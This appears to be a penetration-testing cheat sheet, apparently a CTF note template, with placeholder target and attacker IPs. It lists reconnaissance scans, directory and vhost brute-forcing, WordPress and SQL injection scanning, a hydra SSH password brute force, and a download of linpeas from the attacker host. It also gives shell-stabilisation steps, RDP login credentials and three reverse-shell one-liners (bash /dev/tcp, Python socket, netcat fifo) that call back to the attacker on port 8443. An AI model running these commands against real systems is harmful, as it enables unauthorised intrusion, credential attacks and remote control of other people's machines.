---
target_ip: 1.1.1.1
my_ip: 2.2.2.2
---


```php
nmap -A -p- 1.1.1.1
```

```php
nmap -sC -sV -p- 1.1.1.1
```

```php
dig 1.1.1.1 -t mx
```

```php
proxychains nmap -sT --top-ports=100 -Pn 1.1.1.1
```

```php
gobuster dir -w /usr/share/seclists/SecLists-master/Discovery/ -u 1.1.1.1
```

```php
gobuster vhost --append-domain --wordlist /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt -u 1.1.1.1
```

```php
wpscan --url http://1.1.1.1/webservices/wp/index.php --proxy 127.0.0.1:8080 --enumerate ap tt at
```

```php
sqlmap -u https://1.1.1.1/ –crawl=1
```

```php
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://1.1.1.1
```

```php
wget 2.2.2.2/linpeas.sh
```

```php
enum4linux -h 2.2.2.2
```

```php
curl http://2.2.2.2/linpeas.sh > linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.txt
```

```php
xfreerdp /u:yoshi /p:"Mushroom!" /v:2.2.2.2
```

```php

```

```php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- background `ctrl+z`
```php
stty -a 
```

```php
echo $TERM
```

```php
stty raw -echo 
```
- foreground `fg`
```php
stty rows <x> columns <y>
```

```php
export TERM=xterm
```

```php
bash -c "bash -i >& /dev/tcp/2.2.2.2/8443 0>&1"
```

```php
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.2.2.2",8443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```php
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 2.2.2.2 8443 >/tmp/f
```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```

```php

```










